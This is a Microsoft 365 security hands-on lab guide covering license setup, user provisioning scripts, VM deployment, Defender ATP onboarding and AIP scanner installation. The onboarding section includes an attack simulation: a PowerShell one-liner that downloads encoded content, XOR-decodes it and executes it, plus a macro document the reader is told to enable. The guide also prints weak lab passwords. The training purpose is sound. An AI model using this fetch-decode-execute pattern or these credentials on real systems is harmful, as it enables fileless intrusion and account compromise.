# Implementing Microsoft 365 Security Technologies

## INSTRUCTOR LED LAB - M365HOL

### Introduction

This lab is designed to be used as a supplement to Instructor Led Training and has several sections that you will go through over the next few days. Please click the lab below that corresponds to the technology your are working with.  

## [Lab Environment Configuration](#lab-environment-configuration)

## [Lab 1: Azure Information Protection](#azure-information-protection)

## [Lab 2: Microsoft Cloud App Security](#microsoft-cloud-app-security)

## [Lab 3: Azure Advanced Threat Protection](#Azure-atp-immersion-lab)

## [Lab 4: Windows Defender Advanced Threat Protection](#windows-defender-advanced-threat-protection)

## [Lab 5: Azure Security Center](#azure-security-center)

## [Lab 6: Azure Active Directory](#azure-active-directory)

> [!ALERT] When stopping each section, please ensure that you SAVE the session in between labs rather than END the lab.  If you end the lab, all VM configuration will be reset to initial state and will hinder the experience during future labs.  We have designed this lab to be a good representation of the interoperability between Microsoft 365 Security Technologies so several of the labs will feed information into future labs.


===
# Tips and Tricks
[:arrow_left: Home](#introduction)

There are a few extras throughout this lab that are designed to make your lab experience a smooth and simple process.  Below are some icons you should watch out for that will save you time during each task.

## Interactive Elements

- Each task contains a series of steps required for successful completion of the lab.  To track your progress throughout the lab, check the box to the left of the numbered series.  

	!IMAGE[6mfi1ekm.jpg](\Media\6mfi1ekm.jpg)
- After you check each box, you will see your lab progress at the bottom of the instruction pane.

	!IMAGE[0ggu265u.jpg](\Media\0ggu265u.jpg)
- When you see an instruction for switching computers, click on the **blue link** in the text to have that VM loaded automatically.

	!IMAGE[12i85vgl.jpg](\Media\12i85vgl.jpg)
- Throughout the lab, you will see text with a letter **T** in a square to the left.  This indicates that you can **click on the text** and it will **type it for you** in the VM.  **This will save you lots of time**.

	!IMAGE[cnyu1tdi.jpg](\Media\cnyu1tdi.jpg)

- The last interactive element you will see throughout the lab is the **Open Screenshot** text below many steps.  To reduce clutter, most screenshots have been configured to launch in a popup window.  The only ones left visible are ones that could cause issues if they are missed or if there are multiple elements that are easier to understand with visual representation.

	!IMAGE[n4cqn070.jpg](\Media\n4cqn070.jpg)

## Additional Information

There are also Knowledge Items, Notes, and Hints throughout the lab.

- Knowledge Items are used to provide additional information about a topic related to the task or step.  These are often collapsed to reduce the amount of space they use, but it is recommended that you review these items if you want more information on the subject.

	!IMAGE[8g9nif1j.jpg](\Media\8g9nif1j.jpg)
- Notes are steps that do not require action or modification of any elements.  This includes general observations and reviewing the results of previous steps.

	!IMAGE[kxrbzsr2.jpg](\Media\kxrbzsr2.jpg)
- Hints are recommendations or observations that help with the completion of a step.

	!IMAGE[w11x99oo.jpg](\Media\w11x99oo.jpg)

===
# Lab Environment Configuration
[:arrow_left: Home](#introduction)

There are a few prerequisites that need to be set up to complete all the sections in this lab.  This Exercise will walk you through the items below.

- [Link Windows Defender ATP Licenses](#link-windows-defender-atp-licenses)

- [Redeem Azure Pass](#redeem-azure-pass)

- [Azure AD User Creation](#Azure-ad-user-creation)

- [Azure Security Center Setup](#azure-security-center-setup)
  
- [Windows Defender ATP Onboarding](#windows-defender-atp-onboarding)

- [Workplace Join Clients](#workplace-join-clients)

- [MCAS Environment Proparation](#mcas-environment-preparation)
  
- [Complete Azure Security Center Deployment](#complete-azure-security-center-deployment)

- [Azure Advanced Threat Protection Setup](#azure-advanced-threat-protection-setup)
 
===
# Link Windows Defender ATP Licenses

In this task, we will link Windows Defender ATP licenses to your demo tenant.

1. [] In a new tab, use the provided Windows Defender Advanced Threat Protection Trial Sign up link.

1. [] Click **Yes, add it to my account**.

	!IMAGE[upx8fn9o.jpg](\Media\upx8fn9o.jpg)

	> [!KNOWLEDGE] If you were not already signed into your tenant with Global Admin credentials, use the credentials below
	>
	>```@lab.CloudCredential(134).Username```
	>
	>```@lab.CloudCredential(134).Password```  
	
1. [] On the Check out page, click **Try now**.

	!IMAGE[wlgzkp40.jpg](\Media\wlgzkp40.jpg)
1. [] On the Order Receipt page, click **Continue**.

1. [] Next, click on **Active Users >** or navigate to ```https://admin.microsoft.com/AdminPortal/Home#/users```.

	>[!NOTE] If necessary, log in using the credentials below:
	>
	>```@lab.CloudCredential(134).Username```
	>
	>```@lab.CloudCredential(134).Password```

1. [] Click on MOD Administrator, and in the details page, click **Edit** next to Product licenses.

	!IMAGE[fe5k7wwn.jpg](\Media\fe5k7wwn.jpg)
1. [] Toggle the **WD ATP** license to On and click **Save**.

	!IMAGE[6crecugz.jpg](\Media\6crecugz.jpg)
===
# Redeem Azure Pass

For several of the exercises in this lab series, you will require an active subscription.  We are providing an Azure Pass for this purpose.  You will be provided with an Azure Pass code to use with the instructions below.

### Creating an Azure Pass subscription is a two step process

- Redeem your Azure Pass Promo Code
- Activate your subscription

##Step 1: Redeeming a Microsoft Azure Pass Promo Code:

1. [] Log into @lab.VirtualMachine(Client01).SelectLink using the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Right-click on **Edge** in the taskbar and click on **New InPrivate window**.

1. [] In the InPrivate window, navigate to ```https://www.microsoftazurepass.com```

1. [] Click the **Start** button to get started.

	!IMAGE[wdir7lb3.jpg](\Media\wdir7lb3.jpg)
1. [] Enter the credentials below and select **Sign In**.

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password``` 

	!IMAGE[gtg8pvp1.jpg](\Media\gtg8pvp1.jpg)
1. [] Click **Confirm** if the correct email address is listed.

	!IMAGE[teyx280d.jpg](\Media\teyx280d.jpg)
1. [] Enter your promo code in the Promo code box using the Type Text functionality of the lab environment and click **Claim Promo Code**.

	!IMAGE[w7cijc7e.jpg](\Media\w7cijc7e.jpg)
	!IMAGE[e1l35ko2.jpg](\Media\e1l35ko2.jpg)
	> [!NOTE] It may take up to 5 minutes to process the redemption.

1. [] Click on **Activate** to start setting up your Azure subscription.

	!IMAGE[hsa6yyy7.jpg](\Media\hsa6yyy7.jpg)

## Step 2: Activate your subscription:

1. [] Scroll to the bottom of the page and click **Next**.

	!IMAGE[ihrjazqi.jpg](\Media\ihrjazqi.jpg)
	> [!NOTE] You can keep the pre-populated information.

1. [] Check the box to agree to the terms and click **Sign up**.

	!IMAGE[k2a97g8e.jpg](\Media\k2a97g8e.jpg)
	> [!NOTE] It may take a few minutes to process the request.

1. [] When you are redirected to the Azure Portal, the process is complete.
===
# Azure AD User Creation

In this task, we will create new Azure AD users and assign licenses via PowerShell.  Ina procduction evironment this would be done using Azure AD Connect or a similar tool to maintain a single source of authority, but for lab purposes we are doing it via script to reduce setup time.


```
# Store Tenant FQDN and Short name
$tenantfqdn = "@lab.CloudCredential(134).TenantName"
$tenant = $tenantfqdn.Split('.')[0]

# Build Licensing SKUs
$office = $tenant+":ENTERPRISEPREMIUM"
$ems = $tenant+":EMSPREMIUM"
$wdatp = $tenant+":WIN_DEF_ATP"

# Get Global Admin Credentials
$cred = Get-Credential

# Connect to MSOLService for licensing Operations
Connect-MSOLService -Credential $cred

# Remove existing licenses to ensure enough licenses exist for our users
$LicensedUsers = Get-MsolUser -All  | where {$_.isLicensed -eq $true}
$LicensedUsers | foreach {Set-MsolUserLicense -UserPrincipalName $_.UserPrincipalName -RemoveLicenses $office, $ems}

# Connect to Azure AD using stored credentials to create users
Connect-AzureAD -Credential $cred

# Import Users from local csv file
$users = Import-csv C:\users.csv
foreach ($user in $users){
# Create password profile preventing automatic password change and storing password from csv
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile 
$PasswordProfile.ForceChangePasswordNextLogin = $false 
$PasswordProfile.Password = $user.password

# Store UPN created from csv and tenant
$upn = $user.username+"@"+$tenantfqdn

# Create new Azure AD user
New-AzureADUser -AccountEnabled $True -DisplayName $user.displayname -PasswordProfile $PasswordProfile -MailNickName $user.username -UserPrincipalName $upn

# Assign Office and EMS licenses to users
Set-MsolUserLicense -UserPrincipalName $upn -AddLicenses $office, $ems
}

# Assign Office, EMS, and WDATP licenses to Admin user
$upn = "admin@"+$tenantfqdn
Set-MsolUserLicense -UserPrincipalName $upn -AddLicenses $office, $ems, wdatp
```


===
# Azure Security Center Setup

## VM and Workspace Deployment

This section is intended to deploy dependency Azure resources in an automated way to get you started quickly or in case you need to re-provision your environment.

***Additional notes**:*
- Close the Azure Advisor recommendations if that opens for you.
- When deploying the template below, a number of fields are locked to ensure that the references in the labs are accurate. You are free to choose your location for deployment

### Deploy VMs and Create a Workspace
Use the link below to deploy the following:
- A Log Analytics workspace (ASC-Workspace-xxxx)
- Security Center OMS solution
- 2 Windows VM's (*Win-x*, connected to the workspace)
- 2 Linux Ubuntu VM's (*Linux-x*, connected to the workspace) 

>[!NOTE] Because we are deploying the Security Center solution in the workspace, the VM's will become security managed by Security Center.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open a new tab and navigate to ```https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2Ftianderturpijn%2FAzure-Security-Center%2Fmaster%2FLabs%2F01%2520-%2520VM%2520and%2520Workspace%2520Deployment%2FFiles%2FdeployAscManagedVmsWithLA.json```

	> [!KNOWLEDGE] If needed, log in using the credentials below:
	>
	>```@lab.CloudCredential(134).Username```
	>
	>```@lab.CloudCredential(134).Password```

1. [] On the Custom deployment page, next to **Resource group** click **Create new**.

	!IMAGE[NewRG.png](\Media\NewRG.png)
1. [] When prompted for a Name, provide a name such as ```ASC-Labs``` and press **OK**.

	^IMAGE[Open Screenshot](\Media\RGName.png)
1. [] Select a location, then under **Settings**, type the password ```Securitycenter4ever!```.
1. [] Finally, check the box to agree to the terms and click **Purchase**.

	^IMAGE[Open Screenshot](\Media\Password.png)

1. [] The deployment takes about 13 minutes. Continue to the next task and we will return to the ASC deployment later.

===

# Windows Defender ATP Onboarding

In this task, we will perform initial setup of WD ATP and onboard 2 machines.

1. [] Switch to @lab.VirtualMachine(AdminPC).SelectLink and log in with the password +++@lab.VirtualMachine(AdminPC).Password+++.

1. [] Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com```.
1. [] Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```

1. [] On Step 1, click **Next**.
1. [] On Step 2, choose a data storage location and click **Next**.
1. [] On Step 3, click **Next** several times until the Create your cloud instance dialog pops up, then click **Continue**.
1. [] On Step 4, click the **Download package** button and save the package to your desktop.
1. [] Extract the zip file to your desktop.
1. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
1. [] In the Windows protected your PC dialog, click the **More info** link and click **Run anyway**.
1. [] In the UAC window, click on **More choices** and select use a different account.
1. [] Enter the credentials below and click **Yes**:

	```LabUser```

	```Pa$$w0rd```

1. [] Press **(Y)** to confirm onboarding.
2. [] Return to the browser and click **Start using Windows Defender ATP** (ignore any warnings about onboarding).
3. [] In the Windows Defender Security Center, click on **Settings > Advanced Features** and toggle the switches on for **Azure ATP integration**, **Office 365 Threat Intelligence Connection**, **Microsoft Cloud App Security**, and **Azure Information Protection** and press the **Save preferences** button at the bottom of the page.
	
	!IMAGE[g47p8c30.jpg](\Media\g47p8c30.jpg)

1. [] Switch to @lab.VirtualMachine(VictimPC).SelectLink and log in with the password +++@lab.VirtualMachine(VictimPC).Password+++.

1. [] Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com/```.
1. [] Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```
1. [] On the left, click the **Settings** icon.
 
	!IMAGE[settings.png](\Media\settings.png)

3. [] On the Settings page, under **Machine management**, click **Onboarding**.
   
	!IMAGE[Open Screenshot](\Media\onboarding.png)

1. [] Click **Download package** and **Open** when the download dialog pops up.
2. [] Copy the **WindowsDefenderATPLocalOnboardingScript** to the desktop.
3. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
4. [] Press **(Y)** to confirm onboarding.
5. [] Run **Attack Simulation #1 "Automated investigation (fileless attack)"** by following the instructions below:
	1. [] Open a PowerShell window and click on the code below to type it in the window (please wait until you see **($decryptedBytes))** before pressing **Enter**):
	
	```
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
	```

1. [] Switch to @lab.VirtualMachine(AdminPC).SelectLink and log in with the password +++@lab.VirtualMachine(AdminPC).Password+++.
1. [] Run **Attack Simulation #2 "Automated investigation (backdoor)"** by following the instructions below:
	1. [] On the desktop, double-click on **RS4_WinATP-Intro-Invoice.docm** and enter ```WDATP!diy#``` when prompted for a password.
	2. [] Once the file opens, in the **Security Warning** ribbon, click **Enable Content**.
	3. [] Click **OK** to confirm the attack.
	4. [] Press **Enter** to close the command prompt window.
===
# Workplace Join Clients

In this task, we will join 3 systems to the Azure AD tenant to provide SSO capabilities in Office.

1. [] Log into @lab.VirtualMachine(Client01).SelectLink using the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Right-click on the start menu and click **Run**.
1. [] In the Run dialog, type ```ms-settings:workplace``` and click **OK**.

	>!IMAGE[mssettings.png](\Media\mssettings.png)

1. [] In the Access Work or School settings menu, click on **+ Connect** and enter the credentials below to workplace join the client.

	```adams@@lab.CloudCredential(134).TenantName```
		
	```pass@word1```
1. [] Click **Done**.
1. [] Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com/```.
1. [] Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```
1. [] On the left, click the **Settings** icon.
 
	!IMAGE[settings.png](\Media\settings.png)

3. [] On the Settings page, under **Machine management**, click **Onboarding**.
   
	!IMAGE[Open Screenshot](\Media\onboarding.png)

1. [] Click **Download package** and **Open** when the download dialog pops up.
2. [] Copy the **WindowsDefenderATPLocalOnboardingScript** to the desktop.
1. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
1. [] Press **(Y)** to confirm onboarding.
1. [] Log into @lab.VirtualMachine(Client02).SelectLink using the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Right-click on the start menu and click **Run**.
1. [] In the Run dialog, type ```ms-settings:workplace``` and click **OK**.

	^IMAGE[Open Screenshot](\Media\mssettings.png)

1. [] In the Access Work or School settings menu, click on **+ Connect** and enter the credentials below to workplace join the client.

	```alicea@@lab.CloudCredential(134).TenantName```
		
	```pass@word1```
1. [] Click **Done**.
1. [] Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com/```.
1. [] Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```
1. [] On the left, click the **Settings** icon.
 
	^IMAGE[Open Screenshot](\Media\settings.png)

3. [] On the Settings page, under **Machine management**, click **Onboarding**.
   
	^IMAGE[Open Screenshot](\Media\onboarding.png)

1. [] Click **Download package** and **Open** when the download dialog pops up.
2. [] Copy the **WindowsDefenderATPLocalOnboardingScript** to the desktop.
1. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
1. [] Press **(Y)** to confirm onboarding.
1. [] Log into @lab.VirtualMachine(Client03).SelectLink using the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Right-click on the start menu and click **Run**.
1. [] In the Run dialog, type ```ms-settings:workplace``` and click **OK**.

	^IMAGE[Open Screenshot](\Media\mssettings.png)

1. [] In the Access Work or School settings menu, click on **+ Connect** and enter the credentials below to workplace join the client.

	```evang@@lab.CloudCredential(134).TenantName```
		
	```pass@word1```
1. [] Click **Done**.
1. [] Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com/```.
1. [] Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```
1. [] On the left, click the **Settings** icon.
 
	^IMAGE[Open Screenshot](\Media\settings.png)

3. [] On the Settings page, under **Machine management**, click **Onboarding**.
   
	^IMAGE[Open Screenshot](\Media\onboarding.png)

4. [] Click **Download package** and **Open** when the download dialog pops up.
5. [] Copy the **WindowsDefenderATPLocalOnboardingScript** to the desktop.
6. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
7. [] Press **(Y)** to confirm onboarding.
===
# MCAS Environment Preparation

To be able to complete the different parts of the Cloud App Security labs, the following configuration steps are required.

* [Enabling Office 365 auditing](#Enabling-office-365-auditing)
* [Connect Office 365 to Cloud App Security](#Connect-office-365-to-cloud-app-security)
* [Enabling Azure Information Protection integration](#Enabling-azure-information-protection-integration)

---

## Enabling Office 365 auditing

[:arrow_up: Top](#mcas-environment-preparation)

Most Cloud App Security treat detections capabilities rely on auditing being enabled in your environment. By default, auditing is not enabled in Office 365 and must then be turned on using the **Security & Compliance** admin console or PowerShell.

1. On Client01, go to the [Office 365 admin portal](https://admin.office.com "Office 365 admin portal")
    ![Admin portal](\Media\conf-adminportal.png "Admin portal")

2. Go down on this page and open the **Security & Compliance Center**
    ![Admin portals](\Media\conf-scc.png "Admin portals")

3. In the **Security & Compliance Center**, go to the **Audit log search** menu.
    [Audit log](\Media\conf-auditlog.png "Audit log")

4. You can see here that auditing is not enabled. Click on the **Turn on auditing** button to enable it and click **yes** at the prompt.
    [Turn on auditing](\Media\conf-auditlog.png "Turn on on auditing")
    [Auditing enabled](\Media\conf-auditenabled.png "Auditing enabled")

    >:warning: As this operation can take up to 24h, your instructor will provide you access to another environment to review the alerts for the threat detection lab.

:warning: In addition to enabling auditing in Office 365, some applications like Exchange Online require extra configuration. After enabling auditing at the Office 365 level, we have to enable auditing at the mailbox level. We will perform this configuration before going to the labs.

1. On Client01, open PowerShell.
    [Open PowerShell](\Media\conf-powershell.png "Open PowerShell")

2. Enter the following commands to connect to Exchange Online using PowerShell. When prompted for credentials, enter your Office 365 administrative credentials.
    ``` PowerShell
        $UserCredential = Get-Credential
        $Session = New-PSSession –ConfigurationName Microsoft.Exchange –ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $UserCredential –Authentication Basic -AllowRedirection
        Import-PSSession $Session
    ```

    ![Exchange PowerShell](\Media\conf-psonline.png "Exchange PowerShell")

3. Enter the following commands to enable auditing for your mailboxes. The second command let you verify that auditing is correctly enabled.
    ```PowerShell
        Get-Mailbox -ResultSize Unlimited -Filter {RecipientTypeDetails -eq "UserMailbox"} | Set-Mailbox -AuditEnabled $true
        Get-Mailbox admin | fl audit*
    ```
    >:warning: When you create new mailboxes, auditing is not enabled by default. You will have to use the same commands again to enable auditing for those newly created mailboxes.

    ![Mailbox auditing](\Media\conf-mbxauditing.png "Mailbox Auditing")

>:memo: **Reference:** [Enabling auditing for Exchange Online mailboxes](https://docs.microsoft.com/en-us/office365/securitycompliance/enable-mailbox-auditing?redirectSourcePath=%252fen-us%252farticle%252fenable-mailbox-auditing-in-office-365-aaca8987-5b62-458b-9882-c28476a66918)).

---

## Connect Office 365 to Cloud App Security

[:arrow_up: Top](#mcas-environment-preparation)

To connect Cloud App Security to Office 365, you will have to use the Office 365 app connector. App connectors use the APIs of app providers to enable greater visibility and control by Microsoft Cloud App Security over the apps you connect to.

1. On Client01, open a new tab and go to the [Cloud App Security portal](https://portal.cloudappsecurity.com "Cloud App Security portal")

2. Go to the gear icon and select **App connectors**.

    ![App connector](\Media\conf-appconnector.png "App connector")

3. Click on the **+** button and select Office 365.

    ![Add Office](\Media\conf-addoffice.png "Add Office")

4. Click on **Connect Office 365**. Cloud App Security will then have access to Office 365 activities and files.

    ![Connect Office"](\Media\conf-connectoffice.png "Connect Office")

5. Click on **Test now** to validate the configuration.

    ![Test connectivity](\Media\conf-testoffice.png "Test connectivity")

---

## Enabling Azure Information Protection integration

[:arrow_up: Top](#mcas-environment-preparation)

To prepare the **Information Protection** lab, we have to enable the integration between Cloud App Security and Azure Information Protection as explained in the [Cloud App Security documentation](https://docs.microsoft.com/en-us/cloud-app-security/azip-integration). Enabling the integration between the two solutions is as easy as selecting one single checkbox.

1. Go to Cloud App Security settings.
    ![Settings](\Media\conf-settings.png "Settings")

2. Go down in the settings to the **Azure Information Protection** section and check the **Automatically scan new files** checkbox and click on the "**Save** button.
    ![Enable AIP](\Media\conf-aip.png "Enable AIP")

>:memo: It takes up to **1h** for Cloud App Security to sync the Azure Information classifications.
 
===
# Complete Azure Security Center Deployment

Now that the template has been deployed, we can continue with the configuration of the Azure Security Center settings.

## Configure the data collection settings in ASC

Now that the workspace has been deployed (you don't have to wait for all the resources to be deployed), do the following:

1. [] Navigate to the **Security Center** blade.

	^IMAGE[Open Screenshot](\Media\SC.png)
2. [] In the Security Center - Getting started blade, scroll to the bottom of the window and click on **Start Trial**.

	^IMAGE[Open Screenshot](\Media\StartTrial.png)
3. [] In the next pane, click on **Install agents**.

	^IMAGE[Open Screenshot](\Media\InstallAgent.png)
4. [] In the left-hand pane, under POLICY & COMPLIANCE, click on **Security policy**.

	!IMAGE[SecPol](\Media\SecPol.png)
6. [] On the line where it lists your Azure subscription (Azure pass), click on **Edit settings**.

	^IMAGE[Open Screenshot](\Media\EditSettings.png)
7. [] Verify that **Auto Provisioning** is set to **On**.
8. [] Under Workspace configuration, select **Use another workspace** and select your workspace **ASC-Workspace-xxxx** (which has been created by the template).

	^IMAGE[Open Screenshot](\Media\Workspace.png)
9. [] Click on **Save** at the top of the page.
9. [] Click on **Yes** on **Would you like to reconfigure monitored VMs?**.
10. [] Switch back to **Security Policy** and click **OK** to dismiss the message **Your unsaved edits will be discarded**.

	!IMAGE[SecPol](\Media\SC2.png)
11. [] Next, on the line where it lists your **workspace**, click on **Edit settings**.
12. [] In the left pane, click on **Pricing tier**, select **Standard** and click on **Save**.

	^IMAGE[Open Screenshot](\Media\Pricing.png)
13. [] Click on Data collection and select **All Events** and click on **Save**. 

	^IMAGE[Open Screenshot](\Media\DC.png)

>[!HINT] It can take some time for the VMs to become visible in Security Center
===
# Azure Advanced Threat Protection Setup
 
## Create and configure Azure ATP Workspace 
 
1. []	Login into @lab.VirtualMachine(ContosoDC).SelectLink using the password	+++@lab.VirtualMachine(ContosoDC).Password+++ 
 
2. []	Open Internet Explorer and browse to ```https://portal.atp.azure.com``` and login with the following credentials.  
    
   ```@lab.CloudCredential(134).UserName``` 
 
   ```@lab.CloudCredential(134).Password``` 
    
3. []	Click **Create workspace** 
4. []	Enter name for the workspace (must be unique across azure)
5. []	Select your Geolocation. 
6. []	Click **Create**. 
7. []	Click on the **workspace name** to open the Azure ATP workspace portal. 
8. []	Click **Provide a username and password to connect to your Active Directory forest**.  
9. []	On the Directory Services page enter the following and click **Save**: 
 
||| 
|-----|-----| 
|Username|```aatpservice```| 
|Password|```Password123!@#```| 
|Domain|```contoso.azure```| 
 
 
=== 
## Deploy the Azure ATP Sensor  
 
1. []	Click the **Download Sensor Setup** link. 
1. []   Click  **Download** to download the Sensor installer package. 
1. []   Copy the **Access key**, this will be needed during the installation of the Sensor. 
1. []   Extract the installation files from the Zip file and run **Azure ATP sensor setup.exe**. 

	>[!NOTE] Do not run the installer from within the Zip file, you need to extract the files before running the installer.

1.	Click **Run** in the Open File Security Warning page. 
1.	Select the installation language of choice and click **Next**. 
1.	Click **Next** on the Sensor deployment type page.  
1.	**Paste the Access key** copied from above and click **Install**.  
 
## Configure Domain Synchronizer 
1.	In the Azure ATP console **click on the deployed Sensor** and **toggle the Domain synchronizer candidate switch** to **On** and click **Save**. 

## Configure Windows Defender ATP Integration 
1. In the Azure ATP console click **Windows Dender ATP** and then toggle the **Integration with Widnows Defender ATP** to **On** and click **Save**

	>[!NOTE] This requires that you have already enabled the Windows Defender ATP service. 
 
=== 
## Adding Guest User access to Azure ATP Console.  
 
To allow users not in the companies Azure Active Directory to access the Azure ATP console you configure a guest user and then add them to the proper Azure ATP AAD group.  

1. [] On ContosoDC, open a new tab in IE and browse to ```https://portal.azure.com```. You should be automatically logged in. If not, login with the following credentials.  
   
   ```@lab.CloudCredential(134).UserName``` 
 
   ```@lab.CloudCredential(134).Password``` 
 
2. []	Close any popup windows that might have opened.  
3. []	Click **Azure Active Directory**. 
4. []	Click **Users**. 
5. []	Click **New guest user**. 
6. []	Enter email address for guest user such as ```@lab.User.Email``` and click **Invite**. 
7. []	Close the Users blade by clicking the **X** in the right-hand side.  
8. []	Click **Groups**. 
9. []	Click **Azure ATP {workspace name} Administrators group** (the first Azure ATP Group).  
10. []	Click **Members**. 
11. []	Click **Add members**. 
12. []	Select the **guest user added above** and click **Select**. 
 
> [!NOTE]	After the user accepts the invitation the user will be able to access the Azure ATP console for this workspace using their email account.  
 
===
# Azure Information Protection
[:arrow_left: Home](#introduction)
### Objectives

> [!ALERT] Please ensure you have completed the steps in the [Lab Environment Configuration](#lab-environment-configuration) before continuing.

There are 2 options for this Lab.  These options contain similar content except for the items called out below.

- The **New to AIP** option will walk through the label and policy creation including scoped policies and demonstrating recommended and automatic labeling in Office applications. This option takes significantly longer and so there is a chance that all sections may not be completed.

- The **Experienced with AIP** option assumes that you are familiar with label and policy creation and that you have seen the operation of conditions in Office applications as these will not be demonstrated.  This option will use the predefined labels and global policy populated in the demo tenants.

Click on one of the options below to begin.

## [New to AIP](#exercise-1-configuring-aip-scanner-for-discovery)

## [Experienced with AIP](#exercise-1a-configuring-aip-scanner-for-discovery)

After completing this lab, you will be able to:

- [Configure the Azure Information Protection scanner to discover sensitive data](#exercise-1-configuring-aip-scanner-for-discovery)
- [Configure Azure Information Protection labels](#creating-configuring-and-modifying-sub-labels)
- [Configure Azure Information Protection policies](#configuring-global-policy)
- [Activate Unified Labeling for the Security and Compliance Center](#exercise-3-security-and-compliance-center)
- [Classify and protect content with Azure Information Protection in Office applications](#exercise-4-testing-aip-policies)
- [Classify and protect sensitive data discovered by the AIP Scanner](#configuring-automatic-conditions)
- [Configure Exchange Online Mail Flow Rules for AIP](#configuring-exchange-online-mail-flow-rules)
- [Configure SharePoint IRM Libraries (Optional)](#exercise-7-sharepoint-irm-configuration)

===

# Exercise 1: Configuring AIP Scanner for Discovery
[:arrow_left: Home](#azure-information-protection)

Even before configuring an AIP classification taxonomy, customers can scan and identify files containing sensitive information based on the built-in sensitive information types included in the Microsoft Classification Engine.  

!IMAGE[ahwj80dw.jpg](\Media\ahwj80dw.jpg)

Often, this can help drive an appropriate level of urgency and attention to the risk customers face if they delay rolling out AIP classification and protection.  

In this exercise, we will install the AIP scanner and run it against repositories in discovery mode.  Later in this lab (after configuring labels and conditions) we will revisit the scanner to perform automated classification, labeling, and protection of sensitive documents.

===
# Configuring Azure Log Analytics
[:arrow_left: Home](#azure-information-protection)

In order to collect log data from Azure Information Protection clients and services, you must first configure the log analytics workspace.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] In the InPrivate window, navigate to ```https://portal.azure.com/```
	>
	>^IMAGE[Open Screenshot](\Media\cznh7i2b.jpg)

	> [!KNOWLEDGE] If necessary, log in using the username and password below:
	>
	>```@lab.CloudCredential(134).Username``` 
	>
	>```@lab.CloudCredential(134).Password```
	
1. [] After logging into the portal, type the word ```info``` into the **search bar** and press **Enter**, then click on **Azure Information Protection**. 

	!IMAGE[2598c48n.jpg](\Media\2598c48n.jpg)
	
	> [!HINT] If you do not see the search bar at the top of the portal, click on the **Magnifying Glass** icon to expand it.
	>
	> !IMAGE[ny3fd3da.jpg](\Media\ny3fd3da.jpg)

1. [] In the Azure Information Protection blade, under **Manage**, click **Configure analytics (preview)**.

1. [] Next, click on **+ Create new workspace**.

	!IMAGE[qu68gqfd.jpg](\Media\qu68gqfd.jpg)
1. [] In the Log analytics workspace using the values in the table below and click **OK**.

	|||
	|-----|-----|
	|OMS Workspace|**Unique Workspace Name**|
	|Resource Group|```AIP-RG```|
	|Location|**East US**|

	^IMAGE[Open Screenshot](\Media\5butui15.jpg)
1. [] Next, back in the Configure analytics (preview) blade, **check the box** next to the workspace and click **OK**.

	!IMAGE[gste52sy.jpg](\Media\gste52sy.jpg)
1. [] Click **Yes**, in the confirmation dialog.

	!IMAGE[zgvmm4el.jpg](\Media\zgvmm4el.jpg)
===
# AIP Scanner Setup
In this task we will install the AIP scanner binaries and create the Azure AD Applications necessary for authentication.
[:arrow_left: Home](#azure-information-protection)

## Installing the AIP Scanner Service

The first step in configuring the AIP Scanner is to install the service and connect the database.  This is done with the Install-AIPScanner cmdlet that is provided by the AIP Client software.  The AIPScanner service account has been pre-staged in Active Directory for convenience.

1. [] Switch to @lab.VirtualMachine(Scanner01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.

1. [] Right-click on the **PowerShell** icon in the taskbar and click on **Run as Administrator**.

	!IMAGE[7to6p334.jpg](\Media\7to6p334.jpg)

1. [] At the PowerShell prompt, type ```$SQL = "Scanner01"``` and press **Enter**.
1. [] Next, type ```Install-AIPScanner -SQLServerInstance $SQL``` and press **Enter**.
1. [] When prompted, provide the credentials for the AIP scanner service account.
	
	```Contoso\AIPScanner```

	```Somepass1```

	^IMAGE[Open Screenshot](\Media\pc9myg9x.jpg)

	> [!knowledge] You should see a success message like the one below. 
	>
	>!IMAGE[w7goqgop.jpg](\Media\w7goqgop.jpg)
	>

## Creating Azure AD Applications for the AIP Scanner

